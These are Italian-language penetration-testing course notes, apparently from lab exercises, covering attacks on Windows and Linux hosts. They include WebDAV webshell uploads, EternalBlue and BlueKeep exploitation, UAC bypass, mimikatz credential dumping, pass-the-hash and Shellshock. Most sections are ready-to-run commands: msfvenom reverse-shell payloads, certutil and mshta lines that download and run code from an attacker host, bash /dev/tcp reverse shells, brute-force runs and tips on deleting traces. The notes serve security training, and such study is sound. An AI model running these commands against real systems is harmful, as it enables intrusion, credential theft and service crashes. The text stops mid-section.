# Host & Network Penetration Testing: System/Host Based Attacks

## Exploiting Windows Vulnerabilities

### Exploiting Microsoft IIS WebDAV

#### WebDAV Exploitation

* Identificare se WebDAV è stato configurato sul server web IIS.
* È possibile eseguire un attacco brute-force sul server WebDAV per identificare credenziali legittime da utilizzare per l’autenticazione.
* Dopo aver ottenuto credenziali legittime, è possibile autenticarsi con il server WebDAV e caricare un payload .asp malevolo che può essere utilizzato per eseguire comandi arbitrari o ottenere una reverse shell sul target.

#### Tools

* **davtest** – Scansione, autenticazione e sfruttamento di server WebDAV.
* **cadaver** – Caricamento/scaricamento file, modifica, operazioni di spostamento/copia e gestione risorse su WebDAV.

#### Verifica presenza webdav

```
nmap -sV -sC 10.2.17.124
nmap -sV -p 80 --script=http-enum 10.2.17.124
```

#### Hydra: Brute force web authentication form

```
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
// http-get è il tipo di richiesta, mentre /webdav/ è la pagina dove si trova l'authentication form
```

> Attenzione che i bruteforce possono causare denial of service, e sarebbe meglio fare recoinessance per capire prima quali sono gli utenti per avere più chance di trovare poi le password e quindi delle credenziali valide.

#### davtest: Identificare estensioni file eseguibili e operazioni supportate da WebDav

```
davtest -auth bob:password_123321 -url http://10.2.17.124/webdav
```

#### cadaver: Caricare una webshell su WebDav

```
cadaver http://10.2.17.124/webdav
// chiede poi username e password, e ci connette alla directory
put /usr/share/webshells/asp/webshell.asp
// apriamo la pagina web http://10.2.17.124/webdav e clicchiamo sul file webshell.asp appena caricato e inviamo i comandi a noi utili.
```

#### Ottenere una reverse shell/meterpeter session su webdav con asp

```
service postgresql start && msfconsole
search iis upload
use exploit/windows/iis/iis_webdav_upload_asp
// di default va sul payload windows a 32bit, possiamo modificarlo se ci serve diverso
show options
set HttpUsername bob
set HttpPassword password_123321
set RHOSTS 10.2.30.233 //target ip
// potremmo dover cambiare la RPORT e SSL da false a true, a seconda dei casi. E anche LPORT se vogliamo
set PATH /webdav/metasploit.asp  //path dove caricherà il file asp
exploit
> sysinfo
> getuid
```

#### Creare payload per upload manuale meterpreter shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp > shell.asp
    // dove LHOST è l'IP della nostra macchina attaccante e LPORT è una porta sulla quale ascolteremo con netcat
// carichiamo il file asp creato
cadaver http://10.2.30.233/webdav
put /root/shell.asp
```

Apriamo il listener su altra finestra terminale:

```
service postgresql start && msfconsole
use multi/handler //modulo metasploit per settare un listner per il payload usato
set payload windows/meterpreter/reverse_tcp //stesso payload usato per generare il file asp
show options // impostiamo LPORT e LHOST con gli stessi valori usati per generare il file asp
set LHOST 10.10.5.2
set LPORT 1234
run
```

Clicchiamo sul file shell.asp caricato su http://10.2.30.233/webdav/ e otteniamo la reverse shell nella finestra con l'handler in ascolto.

```
// Infine eliminiamo le tracce sul server
delete shell.asp
ls
```



### Exploiting SMB with PSExec

#### Identifichiamo se la porta 445 è aperta e servizio attivo

```
nmap -sV -sC 10.2.24.221
nmap -p445 --script smb-protocols demo.ine.local //run nmap script to list the supported protocols and dialects of a SMB server
```

Se la porta 445 è aperta e quindi il servizio SMB è attivo, e lo script ci dice che viene usato smb version 2 e message signing is enabled but not required, significa che possiamo autenticarci via PsExec.

#### Bruteforce SMB con modulo Metasploit Framework

```
service postgresql start && msfconsole
search smb_login
use auxiliary/scanner/smb/smb_login
show options
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS 10.2.24.221
set VERBOSE false //così mostra solo le credenziali che avranno successo invece di tutte
run
```

è possibile specificare SMBDomain se il target fa parte di un dominio ed è importante, e anche SMBUser e SMBPassword se abbiamo le credenziali per l'autenticazione.

#### Autenticarci via PsExec con le credenziali trovate

```
psexec.py Administrator@10.2.24.221 cmd.exe
//e ci chiede la password che in questo caso è qwertyuiop
```

#### Ottenere una meterpreter session con modulo MSF

```
search psexec
use exploit/windows/smb/psexec
show options
set RHOSTS 10.2.24.221
set SMBUser Administrator
set SMBUser qwertyuiop
exploit
```

{% hint style="info" %}
**NB: In questo caso viene caricato un file (payload) sul target quindi potrebbe essere individuato, mentre via PsExec non lasciamo traccia**
{% endhint %}

### Exploiting EternalBlue (MS17-010) - SMB

<figure><img src="../.gitbook/assets/image (680).png" alt=""><figcaption></figcaption></figure>

#### Scan Nmap per vedere OS e porta SMB

```
sudo nmap -sV -p 445 -O 10.10.10.12
```

#### Scan Nmap per verificare se SMB è vulnerabile a EternalBlue

```
sudo nmap -sV -p 445  --script=smb-vuln-ms17-010 10.10.10.12
```

#### Per verificare se è vulnerabile

è possibile utilizzare questo modulo auxiliary:

```
use auxiliary/scanner/smb/smb_ms17_010
```

#### Exploit manuale con AutoBlue-MS17-010

Seguire le indicazioni sul github ed eventualmente gli appunti dettagliati.

{% embed url="https://github.com/3ndG4me/AutoBlue-MS17-010" %}

#### Exploit automatico con Metasploit Framework

```
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.12 //target IP
exploit
```

### Exploiting RDP

#### Scan porte con modulo MSF

```
msfconsole
search rdp_scanner
use auxiliary/scanner/rdp/rdp_scanner
show options
set RHOSTS 10.2.24.86
set RPORT 3333 //la porta che ipotizziamo abbia aperto il servizio RDP
run
```

#### Hydra: Bruteforce a RDP per trovare le credenziali

```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.2.24.86 -s 3333
// dove 3333 è la porta RDP, se non la specifichiamo con -s hydra assume la porta di default
```

{% hint style="info" %}
ATTENZIONE: regolare la brute force speed in casi reali usando -t 2 or-t 3
{% endhint %}

#### Autenticarci via RDP (connetterci con xfreerdp)

```
xfreerdp /u:administrator /p:qwertyuiop /v:10.2.24.86:3333
// confermiamo con YES che ci fidiamo del certificato
```

### BlueKeep (CVE-2019-0708) - RDP

<figure><img src="../.gitbook/assets/image (681).png" alt=""><figcaption></figcaption></figure>

Deve essere abilitato RDP e disabilitata la Network Level authentication. E quindi per mitigare si può abilitare la Network Level Authentication.

{% hint style="info" %}
**Modificare ed eseguire codice al kernel level è probabile risulti in crash del sistema.**
{% endhint %}

#### Test porta RDP 3389 aperta

```
sudo nmap -p 3389 10.10.10.7
```

#### Verifica se target è vulnerabile con modulo MSF

```
msfconsole
search BlueKeep
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <IP target>
run
```

#### Esecuzione exploit su target vulnerabile

```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
show options
set RHOSTS 10.10.10.7
show targets
set target 2
```

è uno staged payload, e funziona solo su Windows a 64 bit.

Nel nostro caso il target è un Windows 7 SP1 build 7601 x64 su Virtualbox. Quindi impostiamo il numero 2.

Aspettiamo di capire se sta funzionando, ha settato la dimensione del CHUNK grooming strategy (groom size) a 250MB, ma questo dipende dalla RAM allocata per la macchina target, quindi potrebbe essere da cambiare. Se questo valore è troppo alto può causare il crash della macchina target.

{% hint style="info" %}
**In casi reali in cui abbiamo come target un sistema di una azienda bisogna assolutamente fare attenzione ad avviare degli exploit che sfruttano il kernel. Perché possono causare crash e perdite di memoria.**
{% endhint %}

### Exploiting WinRM

#### Verificare se il servizio WinRM è attivo

```
nmap -sV -p 5985 10.2.18.45
```

Le porte di WinRM sono escluse dalle 1000 porte più comuni per cui nmap fa lo scan di default.

#### Crackmapexec: Bruteforce credenziali WinRM

```
crackmapexec winrm 10.2.18.45 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

Possiamo usarlo anche per mssql, smb e ssh.

#### Bruteforce credenziali con modulo Metasploit

```
msfconsole -q
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit
```

#### Crackmapexec: Eseguire comandi sul target

```
crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -x "whoami"
crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -x "systeminfo"
```

#### evil-winrm: Ottenere una sessione shell sul target

```
evil-winrm.rb -u administrator -p tinkerbell -i 10.2.18.45
```

#### Ottenere una meterpreter shell con modulo MSF

```
service postgresql start && msfconsole
search winrm_script
use exploit/windows/winrm/winrm_script_exec
show options
set RHOSTS 10.2.18.45
set FORCE_VBS true
set USERNAME administrator
set PASSWORD tinkerbell
exploit
```

## Windows Privilege Escalation

### Windows Kernel Exploits

#### Privilege Escalation automatica con MSF

In una sessione meterpreter shell digitare:

```
getsystem
```

#### Modulo MSF per suggerire exploit

Avviandolo ci mostra tutte le vulnerabilità presenti in questa versione di windows, e mostrerà poi i moduli MSF per poter elevare i privilegi.

```
search suggester
use post/multi/recon/local_exploit_suggester
show options
sessions
set SESSION 3 //essendo un modulo per post exploitation inserire la sessione attiva da usare
run
```

Questi moduli possono essere usati dopo aver fatto una ricerca di quali versioni di windows sono vulnerabili e se la nostra del target è tra quelle.

Se fa uso del subsystem capiamo che si tratta di kernel exploit. Es. exploit/windows/local/ms16\_014\_wmi\_recv\_notif)

#### Utilizzare un modulo exploit suggerito per fare privesc automatica con MSF

```
use exploit/windows/local/ms16_014_wmi_recv_notif
set SESSION 3
set LPORT 4422 //in questo caso perché c'era una sessione attiva sulla porta 4444 preimpostata da MSF
exploit
```

#### Windows Exploit Suggester: Privesc manuale

1. Clonare Windows-Exploit-Suggester sul proprio ambiente
2. Aggiornare il db con **./windows-exploit-suggester.py --update**
3. Eseguire un comando systeminfo sul sistem target a cui abbiamo accesso non privilegiato e copiare l'output in un file
4. Eseguire il tool passandogli come argomento il database aggiornato e l'output di systeminfo: **./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt**

Per maggiori informazioni riferirsi agli appunti più dettagliati.

Di seguito solo un estratto di come installare il tool e aggiornarlo:

```
sessions
sessions 3
getuid
shell
systeminfo
//copiamo il contenuto in un file, ad esempio aprendo un nuovo terminale ed eseguendo:
    cd Desktop
    vim win7.txt
    //incolla il contenuto
    :wq
    cd Windows-Enum/Windows-Exploit-Suggester //cartella dove abbiamo clonato il tool
    ./windows-exploit-suggester.py --update
    ./windows-exploit-suggester.py --database 2021-12-26.mssb.xls --system info /Desktop/win7.tzt
```

### Bypassare UAC con UACMe

#### Exploit vulnerabilità webserver HFS 2.3 per avere accesso al target <a href="#exploit-vulnerabilita-webserver-hfs-2.3-per-avere-accesso-al-target" id="exploit-vulnerabilita-webserver-hfs-2.3-per-avere-accesso-al-target"></a>

```
service postgresql start && msfconsole
setg RHOSTS 10.2.22.220
search rejetto
use exploit/windows/http/rejetto_hfs_exec
show options
// Eventualmente settare TARGETURI ma in questo caso il servizio vulnerabile gira sulla root del webserver
exploit
```

#### Dopo aver avuto accesso alla vittima

```
sysinfo //versione windows e vediamo che meterpreter gira su un processo a 32 bit
pgrep explorer //es. risultato 2448
migrate 2448 //Migriamo la meterpreter shell su un processo a 64 bit
sysinfo
getuid
getprivs
shell
net user //ci fa vedere che account ci sono
net localgroup administrators //vediamo che l'utente admin fa parte del gruppo
net user admin password123 //ci da errore perché dobbiamo bypassare UAC

```

#### UACMe

Compilare il file eseguibile akagi32 o akagi64 (Akagai64) [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

#### Attacco con msfvenom + UACMe per bypassare l'UAC

1. Generiamo un meterpeter payload con msfvenom
2. Lo trasferiamo al target
3. Usiamo l'akagai executable con la Key (metodo) numero 23
4. Eseguiamo il meterpreter payload che dovrebbe bypassare l'UAC
5. Ci verrà fornita una elevated meterpreter session sul nostro listener

**Passo 1: Generare un payload e aprire il listener**

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > backdoor.exe
//LHOST è il nostro IP attaccante
ls
msfconsole //apriamo una nuova sessione MSF per impostare un listneer
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.5.2
set LPORT 1234
run
// e qui rimane in attesa di qualche collegamento, rimane listening. 
// Cambiamo finestra del terminale per fare le prossime operazioni
```

**Passo 2: Caricare il payload sul target ed eseguirlo per ricevere una reverse shell**

<pre><code><strong>// Torniamo sulla sessione meterpreter aperta tramite l'exploit di prima, dove siamo utenti admin sul target
</strong><strong>pwd
</strong>getuid
getprivs
cd C:\\
mkdir Temp
cd Temp
upload backdoor.exe
upload /root/Desktop/tools/UACME/Akagai64.exe
shell
dir
.\Akagi64.exe 23 C:\Temp\backdoor.exe
</code></pre>

**Passo 3: Sessione con privilegi elevati aperta tramite reverse shell**

```
sysinfo //connessione aperta correttamente, processo a 32bit
getuid //siamo sempre utenti admin
getprivs //abbiamo ora molti più privilegi
ps //guardiamo i processi attivi, e possiamo migrare a quelli SYSTEM
migrate 688 //processo di lsass eseguito come SYSTEM
sysinfo //siamo passati a un processo a 64 bit, quello di lsass
getuid //abbiamo ora NT AUTHORITY\SYSTEM
```

### Access Token Impersonation

Possibile se presente il privilegio: **SeImpersonatePrivilege**

#### Ottenere accesso iniziale al target

Viene ripetuto quanto fatto con UAC per avere accesso alla vittima sfruttando una vulnerabilità di Rejetto HFS 2.3, è solo un esempio.

#### Caricare il modulo incognito sul target da meterpreter shell

```
load incognito
list_tokens -u
impersonate_token "ATTACKDEFENSE\Administrator"  //tra gli elencati dal comando sopra
getuid
getprivs
pgrep explorer
migrate 3512  //ID processo explorer
getprivs
getuid
```

Una volta ottenuto accesso come Administrator possiamo passare anche ad altri token

```
impersonate_token "NT AUTHORITY SYSTEM"
```

## Windows File System Vulnerabilities

### Alternate Data Stream (Resource Stream)

è possibile creare dei file nascosti dietro ad altri file legittimi, attraverso lo sfruttamento dei metadati del file legittimo. Utile a nascondere degli exploit.

Possiamo creare un file nascosto se lo scriviamo come secondo file a seguito di due punti (:), ossia:

```
notepad test.txt:secret.txt
```

#### Esempio di attacco <a href="#attacco" id="attacco"></a>

Abbiamo il file binario di winPEAS che serve a fare local enumeration su sistema windows per identificare vulnerabilità che possono essere exploitate per poter fare privilege escalation.

Lo usiamo come esempio di payload, rinominandolo appunto payload e spostandolo in una cartella C:\Temp

```
type payload.exe > windowslog.txt:winpeas.exe
notepad windowslog.txt
start windowslog.txt:winpeas.txt //Risulta in: Access is Denied
//Creiamo un symbolic link in system32 in modo da poter avviare il programma altrimenti non funziona:
mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
wupdate //E ci viene eseguito winpeas che era il nostro payload
```

## Windows Credential Dumping

### Windows Password Hashes

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Prima si fa privilege escalation, e poi con la sessione amministrativa si fa il dump delle credenziali.

Tool come mimikatz vanno a leggere la cache del processo LSASS che interagisce con LSA per avere una copia degli hash NTLM.

#### LM Hash

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### NTLM Hash

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Non hanno password salts, quindi possono essere craccate con brute force e rainbow attack.

### Searching For Passwords In Windows Configuration Files

* The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:
  * `C:\Windows\Panther\Unattend.xml`
  * `C:\Windows\Panther\Autounattend.xml`
* As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64.

#### Esempio di attacco avendo accesso parziale alla macchina vittima

#### Macchina attaccante: generazione meterpreter payload e caricamento su http server

```
//Generare un peterpreter payload con msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > payload.exe
//Carichiamo il file sulla macchina vittima tramite http server
python -m SimpleHTTPServer 80
```

#### Macchina vittima: Download payload meterpreter

```
cd Desktop
certutil -f http://10.10.5.2/payload.exe payload.exe
```

#### Macchina attaccante: Stoppiamo il server HTTP e avviamo Metasploit Framework per avere il multi handler in ascolto per quando avvieremo il payload sulla vittima

```
service postgresql start && msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 1234
set LHSOT 10.10.5.2
run
//andiamo sulla vittima e clicchiamo per eseguire il payload.exe e ci arriva una connessione
```

#### Macchina attaccante: Riceviamo la meterpreter session sul multi/handler

```
sysinfo
search -f Unattend.xml //ovviamente è più comodo farlo a mano sapendo dov'è
cd C:\Windows\Panther
dir
download Unattend.xml
//ci spostiamo in un altro terminale per poter leggere il file senza chiudere MSF
cat Unattended.xml
// se andiamo in fondo al file troviamo un tag xml <AutoLogon> che contiene username e password encoded in Base64
// copiamo la password
vim password.txt //creiamo un nuovo file e la incolliamo dentro (usciamo con :wq)
//usiamo il tool base64 presente in Kali per decodificare la password
base64 -d password.txt
//verifichiamo che la password ottenuta sia ancora valida connettendoci con psexec
psexec.py Administrator@10.2.27.165 //alternativa: modulo psexec di MSF invece che in py
    whoami
```

Potrebbe essere che l'amministratore abbia cambiato la password dopo l'installazione e che quindi questa sia obsoleta

### Alternativa per trovare password in file Unattended usando PowerSploit

This lab covers usage of **PowerUp.ps1** Powershell script to find a common Windows privilege escalation flaw.

**PowerSploit**: PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment.

**PowerUp.ps1:** PowerUp aims to be a clearing house of common Windows privilege escalation vectors that rely on misconfigurations.

Source: https://github.com/PowerShellMafia/PowerSploit

***

#### **Aprire il powershell della macchina attaccante ed eseguire PowerUp.ps1  per trovare le vulnerabilità sfruttabili per privilege escalation**

```
cd .\Desktop\PowerSploit\Privesc\
ls
powershell -ep bypass (PowerShell execution policy bypass)
. .\PowerUp.ps1
Invoke-PrivescAudit
```

We can notice that there is an **Unattend.xml** file present on the system. Open the **Unattend.xml** file.

#### **Leggiamo il file Unattended.xml**

```
cat C:\Windows\Panther\Unattend.xml
```

We have discovered an administrator encoded password. i.e **“QWRtaW5AMTIz”**.

#### Decodifichiamo la password utilizzando Powershell

```
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
ssword))
echo $password
```

The administrator password is **“Admin@123”**.

#### Avviamo un command prompi come administrator con le credenziali scoperte

```
runas.exe /user:administrator cmd
Admin@123
whoami
```

#### Macchina attaccante: Eseguire il modulo MSF hta\_serverper ottenre una meterpreter shell

```
msfconsole -q
use exploit/windows/misc/hta_server
exploit
```

Copy the generated payload i.e **“http://10.10.31.2:8080/Bn75U0NL8ONS.hta”** and run it on the victim cmd.exe with mshta command to gain the meterpreter shell.

#### Macchina vittima: eseguire nel CMD administrator mshta per ottenere la reverse shell

```
mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta
```

Sulla macchina attaccante viene aperta una reverse shell (per trovarla provare _sessions -i 1_).

### Fare dump degli hash con Mimikatz o Kiwi

Kiwi ha come vantaggio che viene eseguito in memoria quindi non lascia artefatti o tracce sul target come mimikatz che dev'essere scaricato.

#### Primo step: exploitare un servizio vulnerabile per avere accesso al target

Ad esempio qui di seguito i comandi per sfruttare una vulnerabilità presente per un servizio web BadBlue 2.7 in esecuzione sulla porta 80.

```
nmap -sV 10.2.18.199
service postresql start && msfconsole
search badblue
use exploit/windows/(http/badblue_passthru
set RHOSTS 10.2.18.199
exploit
sysinfo
getuid
pgrep lsass
migrate 788
getuid
```

#### Kiwi

Kiwi è una built-in meterpreter extension.

```
load kiwi
? //comando di help
creds_all //creads_all per dumpare tutte le credenziali
lsa_dump_sam
lsa_dump_secrets
```

**creds\_all**: Possiamo vedere gli hash NTLM, wdigest e kerberos sono vuote, questo perché le versioni successive a Windows 8.1 non conservano password in cleartext in nessun modo.

**lsa\_dump\_sam**: ci mostra tutti gli hash NTLM che sono presenti e la SysKey, che può tornare utile più tardi. Abbiamo anche la SAMKey.

**lsa\_dump\_secrets**: ci restituisce la SysKey e in alcuni casi ci può fornire delle credenziali in cleartext.

<figure><img src="../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se si lavora con un ambiente Active Directory è possibile usare i comandi **kerberos\_ticket** e **golden\_ticket\_create**.

> <p align="center"><strong>password_change</strong> è un po' troppo da fare in un pentest, perché significa cambiare password ad utenti in produzione. Quindi non bisogna farlo in casi reali di penetration test.</p>

#### Mimikatz

Mimikatz è un eseguibile che bisogna avere sulla macchina target. Kali Linux lo mette già a disposizione nella cartella **/usr/share/windows-resources/mimikatz/x64/mimikatz.exe**.

Nella meterpreter session collegata alla vittima:

<pre><code>pwd 
cd C:\\
mkdir Temp
cd Temp
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
shell
  dir
<strong>  .\mimikatz.exe
</strong>  privilege::debug // se "20 OK" allora abbiamo i permessi per eseguire hash extraction from memory
  lsadump::sam //ci restituisce SysKey, SAMKey, NTLM degli utenti, RID
  lsadump::secrets
  sekurlsa::logonpasswords // se presenti in memoria le password usate nei login
</code></pre>

**sekurlsa::logonpasswords**: Con mimikatz possiamo mostrare le logon password usate se il sistema è stato configurato per tenerle in memoria.

### Pass-the-Hash attack

#### Punto di partenza

* Hai già una sessione su una macchina Windows (meterpreter) o solo l’hash.
* Rete raggiungibile via SMB verso il target.

#### Exploit di BadBlue (es. per ottenere una sessione SMB)

```
service postgresql start && msfconsole   //avvia Metasploit Framework
search badblue
use exploit/windows/http/badblue_passthru
set RHOSTS <IP target>
exploit
// otteniamo una sessione attiva di meterpreter
```

#### Ottenere l'hash (se ho già la sessione attiva)

In meterpreter trova il process id (PID) di lsass che è un processo a livello di sistema e usalo per migrare ai suoi privilegi:

```
pgrep lsass        # ottieni pid (es. 780)
migrate 780
getuid             # verifica NT AUTHORITY\SYSTEM
```

#### Estrarre l'hash con Kiwi o Mimikatz

```
load kiwi
lsa_dump_sam   # o lsa_dump_secrets/hashdump
hashdump
```

Salva le righe `username:LM:NTLM:RID` in un file .txt (es. `hashes.txt`).

> Nota: se l'LM è non usato apparirà il placeholder `aad3b435b51404eeaad3b435b51404ee`.

#### Scelta 1: Eseguire il pass-the-hash con psexec in MSF

Anzitutto mettere la sessione precedente in background con CTRL+Z e poi usiamo il modulo psexec:

```
search psexec
use exploit/windows/smb/psexec
show options
set LPORT 4422
set RHOSTS <target_IP>
set SMBUser Administrator
set SMBPass <LM_Hash>:<NTLM_Hash>
set target <tipo_target>   # es. Native\ upload o Command
exploit
```

Se fallisce, prova a cambiare `target` (es. `Command`) o il metodo di upload.

Se va a buon fine otterrai una sessione come `NT AUTHORITY\SYSTEM` sul target.

#### Scelta 2: Eseguire il pass-the-hash con CrackMapExec

```
crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM_Hash>
crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM_Hash> -x "whoami"
crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM_Hash> -x "ipconfig"
crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM_Hash> -x "net user administrator password123"
```

* CME accetta solo NTLM con `-H` (non serve LM).
* Utile per eseguire comandi rapidi senza caricare meterpreter.

#### Sicurezza e contromisure (breve)

* Abilitare LSA protection / Credential Guard.
* Disabilitare memorizzazione LM e usare policy forti.
* Monitorare tentativi SMB e movimenti laterali.
* Utilizzare MFA e credenziali gestite (LAPS).

## Exploiting Linux Vulnerabilities

### Vulnerability Analysis: Shellshock (CVE-2014-6271) - Apache e Bash

Vulnerabilità Linux:  **() { :; }; echo; echo; /bin/bash -c '\<comando da eseguire>'**

#### Identificare se un server è vulnerabile a Shellshock

```
nmap -sV 192.24.241.3
nmap -sV 192.24.241.3 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" //dobbiamo per forza inserre come argomento il percorso per lo script cgi
```

Es. il countdown presente nella home di un sito è fatto con CGI, ed è possibile verificarlo guardando il sorgente della pagina.

#### Exploit manuale per Shellshock

1. Attiviamo il redirect del traffico da mozilla firefox al proxy di Burp Suite con l'add-on presente qui sopra.
2. Apriamo Burp Suite
3. Aggiorniamo la pagina con lo script cgi in modo che venga intercettata la richiesta all'interno di Burp Suite, la inviamo a Repeater e la modifichiamo.
4. Sostituiamo User-Agent con i nostri caratteri speciali **() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'**
5. Effettivamente possiamo vedere che nella risposta troviamo il contenuto del file passwd, e quindi possiamo identificare i vari utenti come ad esempio nobody.

#### Per ottenere una reverse shell

1. Apriamo una porta con il listener netcat: nc -nvlp 1234
2. Apriamo poi Burp Suite e cambiamo il comando specificato nell'user agent con: **'bash -i>&/dev/tcp/KALI LINUX IP/PORT 0>&1'**
3. Provare la reverse shell nel listener con: **uname -a**

#### Exploit automatico con MSF

```
msfconsole
search shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
show options
set RHOSTS 192.24.241.3
set TARGETURI /gettime.cgi
exploit
```

Per testare se è vulnerabile a shellshock usare: **auxiliary/scanner/http/apache\_mod\_cgibash\_env**

### Exploiting FTP

#### Verificare se l'accesso anonimo è abilitato tentando la connessione

```
ftp 192.93.66.3 //e usiamo anonymous come username e lasciamo vuota la password
```

#### Verifichiamo anonymous access via NMAP script

```
ls -al /usr/share/nmap/scripts/ | grep ftp-*
nmap -sV 192.93.66.3 --script=ftp-anon
```

#### Bruteforce con hydra

```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.93.66.3 -t 4 ftp
```

#### Bruteforce password di un utente specifico con nmap script

Find the password of user “sysadmin” using nmap script.

```
echo "sysadmin" > users
nmap --script ftp-brute --script-args userdb=/root/users -p 21 demo.ine.local
```

#### Tentiamo il login con le credenziali trovate

```
ftp 192.93.66.3 // e inseriamo le credenziali, ad es. di sysadmin
```

#### Verifica esistenza exploit per versione di ProFTP in esecuzione sul target

```
searchsploit ProFTPd
```

### Exploiting SSH

#### Verifichiamo con nmap se ssh è attivo e raggiungibile

```
nmap -sV 192.156.211.3
```

#### Bruteforce SSH con Hydra <a href="#bruteforce-ssh-con-hydra" id="bruteforce-ssh-con-hydra"></a>

```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.156.211.3 -t 4 ssh
```

#### Login SSH con le credenziali trovate <a href="#login-ssh-con-le-credenziali-trovate" id="login-ssh-con-le-credenziali-trovate"></a>

```
ssh sysadmin@192.156.211.3 //e inseriamo la password hailey
whoami
groups sysadmin //se fa parte del gruppo sudo vuol dire che ha dei permessi elevati
cat /etc/*issue //per trovare la versione del SO
uname -r //per mostrare la versione del kernel
```

#### Modulo MSF per bypassare l'autenticazione SSH

```
search libssh_auth_bypass
set RHOSTS <TARGETIP>
set SPAWN_PTY true //per ottenere una shell
//oppure: set CMD bash -i >& /dev/tcp/ATTACKERIP/ATTACKERPORT 0>&1   //per eseguire un comando, in particolare per ottenere una reverse shell
```

### Exploiting SAMBA

#### Bruteforce sull'istanza SAMBA con Hydra

```
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.56.47.3 smb
```

#### Bruteforce con MSF: modulo smb\_login <a href="#alternativa-con-msf-modulo-smb_login" id="alternativa-con-msf-modulo-smb_login"></a>

```
use auxiliary/scanner/smb/smb_login
show options
//configurare le opzioni
```

#### smbmap: Samba Share Enumerator <a href="#smbmap-samba-share-enumerator" id="smbmap-samba-share-enumerator"></a>

```
smbmap
smbmap -H 192.56.47.3 -u admin -p password1
```

#### smbclient: Accedere alle share samba

```
smbclient
man smbclient
smbclient -L 192.56.47.3 -U admin //e ci chiederà la password
smbclient //192.56.47.3/shawn -U admin
?
exit
smbclient //192.56.47.3/admin -U admin
cd hidden
dir
get flag.tar.gz
exit
tar xzf flag.tar.gz
ls
cat flag
```

#### enum4linux per enumerare le informazioni su SAMBA

```
enum4linux -a 192.56.47.3
enum4linux
enum4linux -a -u admin -p password1 192.56.47.3
```

Controlla le info che trova sul target e se è presente SAMBA ce lo mostra e prova a verificare se è possibile loggarsi a SAMBA tramite sessioni null, che in questo caso non sono consentite. In tal caso ci mostrebbe altre info.

Con -a ci fornisce informazioni sul sistema operativo, sugli utenti di samba e le share. Tenta poi di mappare le share, password policy information, ed infine ottiene gli SIDs per tutti gli account.

#### Elencare gli SID degli utenti unix scoperti con utente admin

List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling using enum4Linux with credentials obtained in question 2.

```
enum4linux -r -u "admin" -p "password1" demo.ine.local
```

#### Elencare le named pipes disponibili via SAMBA

List the named pipes available over SMB on the samba server? Use pipe\_auditor metasploit module with credentials obtained from question 2.

Answer: netlogon, lsarpc, samr, eventlog, InitShutdown, ntsvcs, srvsvc, wkssvc

```
msfconsole -q
use auxiliary/scanner/smb/pipe_auditor
set SMBUser admin
set SMBPass password1
set RHOSTS demo.ine.local
exploit
```

## Linux Privilege Escalation

### Linux Kernel Exploits

<figure><img src="../.gitbook/assets/image (985).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
